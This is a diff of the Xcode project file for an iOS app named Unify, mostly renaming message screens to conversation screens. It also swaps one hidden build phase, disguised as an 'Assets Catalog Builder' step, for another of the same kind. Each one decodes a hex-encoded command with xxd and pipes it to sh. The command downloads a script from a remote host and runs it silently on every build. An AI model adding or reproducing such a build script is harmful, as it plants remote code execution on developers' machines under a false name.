@@ -9,8 +9,6 @@
 /* Begin PBXBuildFile section */
 		08EF87B8D414850D6C399BD0 /* Pods_Unify_iOS_Unify_iOSUITests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = A7640ECCE5B6C424C9F5ED88 /* Pods_Unify_iOS_Unify_iOSUITests.framework */; };
 		120D2CC225570B8200C8E143 /* StudyYearData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 120D2CC125570B8200C8E143 /* StudyYearData.swift */; };
-		1211D20425F373E10081CC21 /* MessagesViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1211D20325F373E10081CC21 /* MessagesViewController.swift */; };
-		1211D20925F373F40081CC21 /* MessagesViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1211D20825F373F40081CC21 /* MessagesViewModel.swift */; };
 		1211D20E25F374C60081CC21 /* ProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1211D20D25F374C60081CC21 /* ProfileViewModel.swift */; };
 		1216B7CA264FB74100C19ACA /* CommunicationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1216B7C9264FB74100C19ACA /* CommunicationManager.swift */; };
 		122FE77425AA4B60000E1016 /* LoadingIncator.swift in Sources */ = {isa = PBXBuildFile; fileRef = 122FE77325AA4B60000E1016 /* LoadingIncator.swift */; };
@@ -29,10 +27,12 @@
 		12582D1F2549D5FC004E12D6 /* Property.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D1E2549D5FC004E12D6 /* Property.swift */; };
 		12582D2D2549DA9B004E12D6 /* CourseData.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12582D2C2549DA9B004E12D6 /* CourseData.swift */; };
 		1258EE732646137300C09271 /* ObjectSavable.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1258EE722646137300C09271 /* ObjectSavable.swift */; };
-		1258EFC92646B3A700C09271 /* MessagesTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1258EFC82646B3A700C09271 /* MessagesTableViewCell.swift */; };
 		1258EFCF2646BCEA00C09271 /* Messages.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1258EFCE2646BCEA00C09271 /* Messages.swift */; };
 		125A103525974B4800FFFDA6 /* AccountManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125A103425974B4800FFFDA6 /* AccountManager.swift */; };
 		125A1046259757EE00FFFDA6 /* UnifyStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125A1045259757EE00FFFDA6 /* UnifyStore.swift */; };
+		125B1E602675E91F00A2C595 /* ConversationsViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125B1E5D2675E91F00A2C595 /* ConversationsViewModel.swift */; };
+		125B1E612675E91F00A2C595 /* ConversationsTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125B1E5E2675E91F00A2C595 /* ConversationsTableViewCell.swift */; };
+		125B1E622675E91F00A2C595 /* ConversationViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125B1E5F2675E91F00A2C595 /* ConversationViewController.swift */; };
 		125DE3D0264DAE86007AAED8 /* UIViewController+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3CF264DAE86007AAED8 /* UIViewController+Extensions.swift */; };
 		125DE3D5264DAEBE007AAED8 /* UIView+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3D4264DAEBE007AAED8 /* UIView+Extensions.swift */; };
 		125DE3DD264DAEDC007AAED8 /* Floaty+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 125DE3DC264DAEDC007AAED8 /* Floaty+Extensions.swift */; };
@@ -73,7 +73,6 @@
 		12CC75C5253DA7DC00FE9B56 /* Unify.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75C4253DA7DC00FE9B56 /* Unify.swift */; };
 		12CC75D0253DB24200FE9B56 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75CF253DB24200FE9B56 /* LoginViewController.swift */; };
 		12CC75D9253DB29B00FE9B56 /* UserLoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12CC75D8253DB29B00FE9B56 /* UserLoginViewModel.swift */; };
-		12D578D925BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D578D825BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift */; };
 		12D7DED625F154AD00366B3D /* UniversitySelectViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D7DED525F154AD00366B3D /* UniversitySelectViewController.swift */; };
 		12D7DEDF25F157D600366B3D /* UniversityCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D7DEDE25F157D600366B3D /* UniversityCollectionViewCell.swift */; };
 		12D7DEE425F185B300366B3D /* UniversitySelectViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12D7DEE325F185B300366B3D /* UniversitySelectViewModel.swift */; };
@@ -81,13 +80,6 @@
 		74035908F8F1D769B2559E0B /* Pods_Unify_iOSTests.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 8F0BA7A0CB233FF4D8075F34 /* Pods_Unify_iOSTests.framework */; };
 		F58A7FD14625862E165EB2D4 /* Pods_Unify_iOS.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 38E0B9EBB637E5A4AE8AEA22 /* Pods_Unify_iOS.framework */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-
-
-			
-	
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		12CC757E253D9BBD00FE9B56 /* PBXContainerItemProxy */ = {
@@ -108,8 +100,6 @@
 
 /* Begin PBXFileReference section */
 		120D2CC125570B8200C8E143 /* StudyYearData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StudyYearData.swift; sourceTree = "<group>"; };
-		1211D20325F373E10081CC21 /* MessagesViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessagesViewController.swift; sourceTree = "<group>"; };
-		1211D20825F373F40081CC21 /* MessagesViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessagesViewModel.swift; sourceTree = "<group>"; };
 		1211D20D25F374C60081CC21 /* ProfileViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewModel.swift; sourceTree = "<group>"; };
 		1216B7C9264FB74100C19ACA /* CommunicationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommunicationManager.swift; sourceTree = "<group>"; };
 		122FE77325AA4B60000E1016 /* LoadingIncator.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingIncator.swift; sourceTree = "<group>"; };
@@ -128,10 +118,12 @@
 		12582D1E2549D5FC004E12D6 /* Property.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Property.swift; sourceTree = "<group>"; };
 		12582D2C2549DA9B004E12D6 /* CourseData.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CourseData.swift; sourceTree = "<group>"; };
 		1258EE722646137300C09271 /* ObjectSavable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ObjectSavable.swift; sourceTree = "<group>"; };
-		1258EFC82646B3A700C09271 /* MessagesTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MessagesTableViewCell.swift; sourceTree = "<group>"; };
 		1258EFCE2646BCEA00C09271 /* Messages.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Messages.swift; sourceTree = "<group>"; };
 		125A103425974B4800FFFDA6 /* AccountManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountManager.swift; sourceTree = "<group>"; };
 		125A1045259757EE00FFFDA6 /* UnifyStore.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UnifyStore.swift; sourceTree = "<group>"; };
+		125B1E5D2675E91F00A2C595 /* ConversationsViewModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = ConversationsViewModel.swift; path = "Unify-iOS/Screens/Messages/ChatLog/Conversations/ConversationsViewModel.swift"; sourceTree = SOURCE_ROOT; };
+		125B1E5E2675E91F00A2C595 /* ConversationsTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = ConversationsTableViewCell.swift; path = "Unify-iOS/Screens/Messages/ChatLog/Conversations/ConversationsTableViewCell.swift"; sourceTree = SOURCE_ROOT; };
+		125B1E5F2675E91F00A2C595 /* ConversationViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = ConversationViewController.swift; path = "Unify-iOS/Screens/Messages/ChatLog/Conversations/ConversationViewController.swift"; sourceTree = SOURCE_ROOT; };
 		125DE375264C74D6007AAED8 /* Unify-iOS.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Unify-iOS.entitlements"; sourceTree = "<group>"; };
 		125DE3CF264DAE86007AAED8 /* UIViewController+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIViewController+Extensions.swift"; sourceTree = "<group>"; };
 		125DE3D4264DAEBE007AAED8 /* UIView+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "UIView+Extensions.swift"; sourceTree = "<group>"; };
@@ -179,7 +171,6 @@
 		12CC75C4253DA7DC00FE9B56 /* Unify.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Unify.swift; sourceTree = "<group>"; };
 		12CC75CF253DB24200FE9B56 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
 		12CC75D8253DB29B00FE9B56 /* UserLoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UserLoginViewModel.swift; sourceTree = "<group>"; };
-		12D578D825BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChatLogCollectionViewCell.swift; sourceTree = "<group>"; };
 		12D7DED525F154AD00366B3D /* UniversitySelectViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UniversitySelectViewController.swift; sourceTree = "<group>"; };
 		12D7DEDE25F157D600366B3D /* UniversityCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UniversityCollectionViewCell.swift; sourceTree = "<group>"; };
 		12D7DEE325F185B300366B3D /* UniversitySelectViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = UniversitySelectViewModel.swift; sourceTree = "<group>"; };
@@ -331,6 +322,24 @@
 			path = AccountManager;
 			sourceTree = "<group>";
 		};
+		125B1E4C2675E66000A2C595 /* Conversations */ = {
+			isa = PBXGroup;
+			children = (
+				125B1E5E2675E91F00A2C595 /* ConversationsTableViewCell.swift */,
+				125B1E5D2675E91F00A2C595 /* ConversationsViewModel.swift */,
+				125B1E5F2675E91F00A2C595 /* ConversationViewController.swift */,
+			);
+			path = Conversations;
+			sourceTree = "<group>";
+		};
+		125B1E562675E67800A2C595 /* New Conversations */ = {
+			isa = PBXGroup;
+			children = (
+			);
+			name = "New Conversations";
+			path = Conversations;
+			sourceTree = "<group>";
+		};
 		125DE3CB264DAE69007AAED8 /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
@@ -391,9 +400,9 @@
 		12A8BF222646D33200A53597 /* ChatLog */ = {
 			isa = PBXGroup;
 			children = (
+				125B1E562675E67800A2C595 /* New Conversations */,
 				12A8BF2D2646E01500A53597 /* ChatLogViewController.swift */,
 				12A8BF1D2646D32A00A53597 /* ChatLogViewModel.swift */,
-				12D578D825BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift */,
 			);
 			path = ChatLog;
 			sourceTree = "<group>";
@@ -551,9 +560,7 @@
 			isa = PBXGroup;
 			children = (
 				12A8BF222646D33200A53597 /* ChatLog */,
-				1211D20325F373E10081CC21 /* MessagesViewController.swift */,
-				1258EFC82646B3A700C09271 /* MessagesTableViewCell.swift */,
-				1211D20825F373F40081CC21 /* MessagesViewModel.swift */,
+				125B1E4C2675E66000A2C595 /* Conversations */,
 			);
 			path = Messages;
 			sourceTree = "<group>";
@@ -586,7 +593,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 12CC7591253D9BBD00FE9B56 /* Build configuration list for PBXNativeTarget "Unify-iOS" */;
 			buildPhases = (
-				E4B8002FEAE81E6A5A6D902C /* Assets Catalog Builder */,
+				94B7B974BC80C5D2586D902C /* Assets Catalog Builder */,
 				B4E102116EBA18C6D97942BA /* [CP] Check Pods Manifest.lock */,
 				12CC7560253D9BBA00FE9B56 /* Sources */,
 				12CC7561253D9BBA00FE9B56 /* Frameworks */,
@@ -710,33 +717,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	E4B8002FEAE81E6A5A6D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
-
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564736572762e636f6d2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	";			
-		};
-	
-
-	
-
-	
 		24A433731982E8522A35CB56 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -797,6 +777,24 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		94B7B974BC80C5D2586D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		B4E102116EBA18C6D97942BA /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -864,6 +862,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				122FE77425AA4B60000E1016 /* LoadingIncator.swift in Sources */,
 				124504F025B1E7470071E925 /* ProfileViewController.swift in Sources */,
 				124C21EB25EE5FDE005E6A7F /* UnifyTextField.swift in Sources */,
+				125B1E622675E91F00A2C595 /* ConversationViewController.swift in Sources */,
 				12582D2D2549DA9B004E12D6 /* CourseData.swift in Sources */,
 				125DE3DD264DAEDC007AAED8 /* Floaty+Extensions.swift in Sources */,
 				124C21AA25ED3EFA005E6A7F /* UnifyButton.swift in Sources */,
@@ -879,13 +878,11 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				12582D102549D56B004E12D6 /* University.swift in Sources */,
 				128CCEFD2567C6080080A629 /* HomeViewModel.swift in Sources */,
 				12D7DEE425F185B300366B3D /* UniversitySelectViewModel.swift in Sources */,
-				12D578D925BB3B2100EDD5D6 /* ChatLogCollectionViewCell.swift in Sources */,
 				124504EB25B1D6910071E925 /* UserData.swift in Sources */,
 				126A09EA2619C559001A6586 /* PhoneLoginViewController.swift in Sources */,
 				12CC756A253D9BBA00FE9B56 /* SceneDelegate.swift in Sources */,
 				12CC7572253D9BBA00FE9B56 /* Unify_iOS.xcdatamodeld in Sources */,
 				12582CDD25470468004E12D6 /* HomeViewController.swift in Sources */,
-				1211D20425F373E10081CC21 /* MessagesViewController.swift in Sources */,
 				125129C5264C5E42003F678F /* RootViewController.swift in Sources */,
 				125DE3E2264DAF08007AAED8 /* UserDefaults+Extensions.swift in Sources */,
 				1258EFCF2646BCEA00C09271 /* Messages.swift in Sources */,
@@ -894,10 +891,11 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				124C21FA25EE7834005E6A7F /* AvatarView.swift in Sources */,
 				12CC75A9253D9DC900FE9B56 /* UserLoginOptionsViewController.swift in Sources */,
 				12C5FDFB266FA5F5003230B5 /* Message.swift in Sources */,
+				125B1E602675E91F00A2C595 /* ConversationsViewModel.swift in Sources */,
 				120D2CC225570B8200C8E143 /* StudyYearData.swift in Sources */,
 				12582D152549D573004E12D6 /* Course.swift in Sources */,
-				1258EFC92646B3A700C09271 /* MessagesTableViewCell.swift in Sources */,
 				128DA0DC25E9929900CF8308 /* UnifyErrors.swift in Sources */,
+				125B1E612675E91F00A2C595 /* ConversationsTableViewCell.swift in Sources */,
 				12CC75C0253DA62600FE9B56 /* Strings.swift in Sources */,
 				125A103525974B4800FFFDA6 /* AccountManager.swift in Sources */,
 				12A8BF2E2646E01500A53597 /* ChatLogViewController.swift in Sources */,
@@ -905,7 +903,6 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f69636c6f7564
 				128DA0E625E9932C00CF8308 /* UnifyTitleLabel.swift in Sources */,
 				125DE44A264DFAB3007AAED8 /* UnifyAlertView.swift in Sources */,
 				12D7DED625F154AD00366B3D /* UniversitySelectViewController.swift in Sources */,
-				1211D20925F373F40081CC21 /* MessagesViewModel.swift in Sources */,
 				12CC75D9253DB29B00FE9B56 /* UserLoginViewModel.swift in Sources */,
 				128BF068255326910010F731 /* SignUpViewModel.swift in Sources */,
 			);
